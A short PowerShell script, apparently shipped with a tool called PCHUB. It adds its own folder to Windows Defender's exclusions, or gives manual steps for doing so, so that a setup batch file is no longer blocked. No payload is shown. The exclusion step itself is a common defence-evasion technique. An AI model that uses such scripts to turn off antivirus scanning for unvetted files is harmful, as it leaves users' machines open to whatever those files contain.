# Run once as Administrator before setup if Windows Defender blocks PCHUB files.
$folder = $PSScriptRoot
Write-Host ""
Write-Host "PCHUB — Windows Defender exclusion"
Write-Host "=================================="
Write-Host "Folder: $folder"
Write-Host ""

try {
  Add-MpPreference -ExclusionPath $folder -ErrorAction Stop
  Write-Host "SUCCESS: Added exclusion. You can run SkyPC-Setup.bat now." -ForegroundColor Green
} catch {
  Write-Host "Could not auto-add (need Administrator)." -ForegroundColor Yellow
  Write-Host ""
  Write-Host "Do this manually:"
  Write-Host "  1. Open Windows Security"
  Write-Host "  2. Virus & threat protection -> Manage settings"
  Write-Host "  3. Exclusions -> Add an exclusion -> Folder"
  Write-Host "  4. Select: $folder"
}

Write-Host ""
Read-Host "Press Enter to close"
